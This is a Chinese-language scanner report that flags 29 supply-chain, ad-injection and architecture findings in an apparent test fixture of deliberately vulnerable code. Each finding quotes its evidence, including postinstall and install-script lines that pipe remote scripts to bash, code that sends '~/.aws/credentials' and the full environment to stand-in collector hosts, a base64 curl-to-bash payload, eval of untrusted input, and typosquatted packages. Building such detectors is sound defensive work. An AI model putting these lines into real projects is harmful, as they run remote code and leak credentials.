# dsh-code-quarantine 报告

- **判定**: 🛑 BLOCK
- **模式**: `full`
- **目标**: `tests/fixtures/vulnerable`
- **扫描文件**: 13（跳过 0）
- **统计**: CRITICAL 8 / WARNING 18 / INFO 3

| # | 级别 | 规则 | 位置 | 分类 | 说明 |
|---|------|------|------|------|------|
| 1 | CRITICAL | `AD005` | `src/page.html:6` | ad_injection | 引入未受信外部资源: stat-collect.track-js.top |
| 2 | CRITICAL | `AD005` | `src/page.html:10` | ad_injection | 引入未受信外部资源: promo-frame.adnet-xyz.icu |
| 3 | CRITICAL | `SC102` | `package.json:8` | supply_chain | 远程下载后管道执行 / 反弹 shell 特征 |
| 4 | CRITICAL | `SC107` | `package.json:8` | supply_chain | 安装钩子 postinstall 含下载/执行动作: curl -fsSL https://registry-hook.npm-cdn.top/setup.sh \| bash |
| 5 | CRITICAL | `SC102` | `scripts/install.sh:6` | supply_chain | 远程下载后管道执行 / 反弹 shell 特征 |
| 6 | CRITICAL | `SC104` | `src/envdump.py:8` | supply_chain | 完整环境变量集合被序列化后外发 |
| 7 | CRITICAL | `SC103` | `src/exfil.py:7` | supply_chain | 读取凭据类路径「.aws/credentials」并存在出站请求 |
| 8 | CRITICAL | `SC105` | `src/obfuscated.py:4` | supply_chain | base64 编码载荷解码后包含: shell, url |
| 9 | WARNING | `AD003` | `scripts/install.sh:6` | ad_injection | 外部域名命中风险特征（suspicious）: get.fastnode-helper.top |
| 10 | WARNING | `AD001` | `src/ad_comment.py:9` | ad_injection | 推广话术「推荐访问」与外链共现: relay-fast-01.xyz |
| 11 | WARNING | `AD003` | `src/domain/service.py:6` | ad_injection | 外部域名命中风险特征（suspicious）: api.vendor-x.top |
| 12 | WARNING | `AD003` | `src/exfil.py:9` | ad_injection | 外部域名命中风险特征（suspicious）: collector.metrics-sink.top |
| 13 | WARNING | `AD003` | `src/promo_strings.py:3` | ad_injection | 外部域名命中风险特征（suspicious）: relay-02.fastnode.top |
| 14 | WARNING | `AD002` | `src/promo_strings.py:4` | ad_injection | 代码字符串中的硬编码外链未被网络/链接 API 使用: promo.dsh-relay-cdn.com |
| 15 | WARNING | `AD004` | `src/promo_strings.py:5` | ad_injection | 代码逻辑区出现推广性联系方式: t.me/ |
| 16 | WARNING | `AR001` | `src/domain/service.py:1` | architecture_deviation | 分层违规：该层文件直接导入了外部实现依赖（flask, requests） |
| 17 | WARNING | `AR002` | `src/domain/service.py:6` | architecture_deviation | 模块导入即产生副作用: requests.get |
| 18 | WARNING | `AR006` | `src/domain/service.py:11` | architecture_deviation | __init__ 中执行 I/O: open |
| 19 | WARNING | `AR003` | `src/domain/service.py:17` | architecture_deviation | 可疑命名「debug_exec_bypass」：与后门/绕过语义高度相关 |
| 20 | WARNING | `SC108` | `package.json:13` | supply_chain | 依赖名 reqeusts 与知名包 requests 编辑距离 2，疑似仿冒 |
| 21 | WARNING | `SC109` | `package.json:16` | supply_chain | 发布目标指向非官方 registry: npm.mirror-evil.top |
| 22 | WARNING | `SC109` | `requirements.txt:1` | supply_chain | 索引源指向非官方 registry: pypi.mirror-evil.top |
| 23 | WARNING | `SC108` | `requirements.txt:2` | supply_chain | 依赖名 reqeusts 与知名包 requests 编辑距离 2，疑似仿冒 |
| 24 | WARNING | `SC101` | `src/domain/service.py:18` | supply_chain | 动态执行调用 eval(动态参数·来自不可信输入) |
| 25 | WARNING | `SC101` | `src/obfuscated.py:9` | supply_chain | subprocess 调用开启 shell=True: subprocess.run |
| 26 | WARNING | `SC110` | `src/tls.py:5` | supply_chain | 显式关闭 TLS 证书校验 |
| 27 | INFO | `AR005` | `src/pkg_a.py:1` | architecture_deviation | 循环依赖: pkg_a -> pkg_b -> pkg_a |
| 28 | INFO | `SC106` | `package.json:11` | supply_chain | 依赖 axios 未锁定版本 (*) |
| 29 | INFO | `SC106` | `requirements.txt:3` | supply_chain | 依赖 flask 未精确锁定版本 (>=2.0) |

## 详情

### 1. `AD005` src/page.html:6
- 原因: 引入未受信外部资源: stat-collect.track-js.top
- 证据: `<script src="https://stat-collect.track-js.top/collect.js"></script>`
- 修复: 移除该外链资源；确需 CDN 时固定版本并加 integrity/crossorigin，同时写入 allowlist
- 置信度: high

### 2. `AD005` src/page.html:10
- 原因: 引入未受信外部资源: promo-frame.adnet-xyz.icu
- 证据: `<iframe src="https://promo-frame.adnet-xyz.icu/embed" width="300" height="200"></iframe>`
- 修复: 移除该外链资源；确需 CDN 时固定版本并加 integrity/crossorigin，同时写入 allowlist
- 置信度: high

### 3. `SC102` package.json:8
- 原因: 远程下载后管道执行 / 反弹 shell 特征
- 证据: `"postinstall": "curl -fsSL https://registry-hook.npm-cdn.top/setup.sh | bash"`
- 修复: 下载到临时文件并校验签名/哈希后再执行；禁止在构建脚本中出现远程管道执行
- 置信度: high

### 4. `SC107` package.json:8
- 原因: 安装钩子 postinstall 含下载/执行动作: curl -fsSL https://registry-hook.npm-cdn.top/setup.sh | bash
- 证据: `"postinstall": "curl -fsSL https://registry-hook.npm-cdn.top/setup.sh | bash"`
- 修复: 移除安装期副作用；必要的二进制准备改为显式命令并校验哈希
- 置信度: high

### 5. `SC102` scripts/install.sh:6
- 原因: 远程下载后管道执行 / 反弹 shell 特征
- 证据: `curl -fsSL https://get.fastnode-helper.top/install.sh | bash`
- 修复: 下载到临时文件并校验签名/哈希后再执行；禁止在构建脚本中出现远程管道执行
- 置信度: high

### 6. `SC104` src/envdump.py:8
- 原因: 完整环境变量集合被序列化后外发
- 证据: `json=dict(os.environ),`
- 修复: 只传递显式白名单内的非敏感配置项
- 置信度: high

### 7. `SC103` src/exfil.py:7
- 原因: 读取凭据类路径「.aws/credentials」并存在出站请求
- 证据: `creds = open(os.path.expanduser("~/.aws/credentials")).read()`
- 修复: 删除该读写链路；凭据只能通过受控的密钥管理服务注入，且不得随请求外发
- 置信度: high

### 8. `SC105` src/obfuscated.py:4
- 原因: base64 编码载荷解码后包含: shell, url
- 证据: `BLOB = "Y3VybCAtZnNTTCBodHRwczovL2Nkbi5wYXlsb2FkLWhvc3QudG9wL3guc2ggfCBiYXNo"`
- 修复: 删除编码载荷；源码中不应出现可执行内容的编码形式
- 置信度: high

### 9. `AD003` scripts/install.sh:6
- 原因: 外部域名命中风险特征（suspicious）: get.fastnode-helper.top
- 证据: `curl -fsSL https://get.fastnode-helper.top/install.sh | bash`
- 修复: 移除该外部依赖；若确为自建中转，请将该域名加入 allowlist 并在评审中说明
- 置信度: high

### 10. `AD001` src/ad_comment.py:9
- 原因: 推广话术「推荐访问」与外链共现: relay-fast-01.xyz
- 证据: `# 推荐访问 https://relay-fast-01.xyz 获取最新镜像，速度更快`
- 修复: 删除推广话术与外链；若该链接确为项目必需文档，改为官方域名或加入 rules/allowlist.yaml
- 置信度: high

### 11. `AD003` src/domain/service.py:6
- 原因: 外部域名命中风险特征（suspicious）: api.vendor-x.top
- 证据: `BOOTSTRAP = requests.get("https://api.vendor-x.top/bootstrap", timeout=3).json()`
- 修复: 移除该外部依赖；若确为自建中转，请将该域名加入 allowlist 并在评审中说明
- 置信度: high

### 12. `AD003` src/exfil.py:9
- 原因: 外部域名命中风险特征（suspicious）: collector.metrics-sink.top
- 证据: `"https://collector.metrics-sink.top/ingest",`
- 修复: 移除该外部依赖；若确为自建中转，请将该域名加入 allowlist 并在评审中说明
- 置信度: high

### 13. `AD003` src/promo_strings.py:3
- 原因: 外部域名命中风险特征（suspicious）: relay-02.fastnode.top
- 证据: `NOTE = "https://relay-02.fastnode.top/api"`
- 修复: 移除该外部依赖；若确为自建中转，请将该域名加入 allowlist 并在评审中说明
- 置信度: high

### 14. `AD002` src/promo_strings.py:4
- 原因: 代码字符串中的硬编码外链未被网络/链接 API 使用: promo.dsh-relay-cdn.com
- 证据: `BANNER = "https://promo.dsh-relay-cdn.com/banner.png"`
- 修复: 确认该 URL 是否为业务必需；否则删除，或将 base URL 收敛到配置中心
- 置信度: medium

### 15. `AD004` src/promo_strings.py:5
- 原因: 代码逻辑区出现推广性联系方式: t.me/
- 证据: `CONTACT = "t.me/relay_support_group"`
- 修复: 移除联系方式；项目需要联系信息时放入 README 或 SECURITY.md
- 置信度: high

### 16. `AR001` src/domain/service.py:1
- 原因: 分层违规：该层文件直接导入了外部实现依赖（flask, requests）
- 证据: `import requests`
- 修复: 通过端口/适配器（依赖倒置）隔离外部实现，领域层只依赖抽象接口
- 置信度: high

### 17. `AR002` src/domain/service.py:6
- 原因: 模块导入即产生副作用: requests.get
- 证据: `BOOTSTRAP = requests.get("https://api.vendor-x.top/bootstrap", timeout=3).json()`
- 修复: 将副作用收敛到函数/服务入口，模块导入应保持无副作用（便于测试与冷启动）
- 置信度: high

### 18. `AR006` src/domain/service.py:11
- 原因: __init__ 中执行 I/O: open
- 证据: `self.cache = open("/tmp/users.cache", "w")`
- 修复: 将 I/O 移到显式的方法调用中，构造与取值应保持轻量、可预期
- 置信度: high

### 19. `AR003` src/domain/service.py:17
- 原因: 可疑命名「debug_exec_bypass」：与后门/绕过语义高度相关
- 证据: `def debug_exec_bypass(payload):`
- 修复: 重命名并说明用途；此类命名即便实现无害也应复核
- 置信度: high

### 20. `SC108` package.json:13
- 原因: 依赖名 reqeusts 与知名包 requests 编辑距离 2，疑似仿冒
- 证据: `"reqeusts": "2.31.0"`
- 修复: 核对包名来源与 registry；确认后在 allowlist.similar_packages 中登记
- 置信度: high

### 21. `SC109` package.json:16
- 原因: 发布目标指向非官方 registry: npm.mirror-evil.top
- 证据: `"registry": "https://npm.mirror-evil.top/"`
- 修复: 恢复官方 registry；私有源需在 allowlist.registries 中登记
- 置信度: high

### 22. `SC109` requirements.txt:1
- 原因: 索引源指向非官方 registry: pypi.mirror-evil.top
- 证据: `--index-url https://pypi.mirror-evil.top/simple`
- 修复: 恢复官方 registry；私有源需在 allowlist.registries 中登记
- 置信度: high

### 23. `SC108` requirements.txt:2
- 原因: 依赖名 reqeusts 与知名包 requests 编辑距离 2，疑似仿冒
- 证据: `reqeusts==2.31.0`
- 修复: 核对包名来源与 registry；确认后在 allowlist.similar_packages 中登记
- 置信度: high

### 24. `SC101` src/domain/service.py:18
- 原因: 动态执行调用 eval(动态参数·来自不可信输入)
- 证据: `return eval(payload)`
- 修复: 改为显式调用或安全的解析方式；确需动态执行时限制输入来源并加白名单校验
- 置信度: high

### 25. `SC101` src/obfuscated.py:9
- 原因: subprocess 调用开启 shell=True: subprocess.run
- 证据: `subprocess.run(cmd, shell=True, check=False)`
- 修复: 改为显式调用或安全的解析方式；确需动态执行时限制输入来源并加白名单校验
- 置信度: high

### 26. `SC110` src/tls.py:5
- 原因: 显式关闭 TLS 证书校验
- 证据: `return requests.get(url, verify=False, timeout=3)`
- 修复: 恢复证书校验；自签环境通过 CA 配置解决
- 置信度: high

### 27. `AR005` src/pkg_a.py:1
- 原因: 循环依赖: pkg_a -> pkg_b -> pkg_a
- 证据: `import pkg_b`
- 修复: 抽取共享接口到独立模块，或改用依赖注入打破环
- 置信度: medium

### 28. `SC106` package.json:11
- 原因: 依赖 axios 未锁定版本 (*)
- 证据: `"axios": "*",`
- 修复: 固定版本并提交 lockfile
- 置信度: high

### 29. `SC106` requirements.txt:3
- 原因: 依赖 flask 未精确锁定版本 (>=2.0)
- 证据: `flask>=2.0`
- 修复: 固定版本并提交 lockfile
- 置信度: high
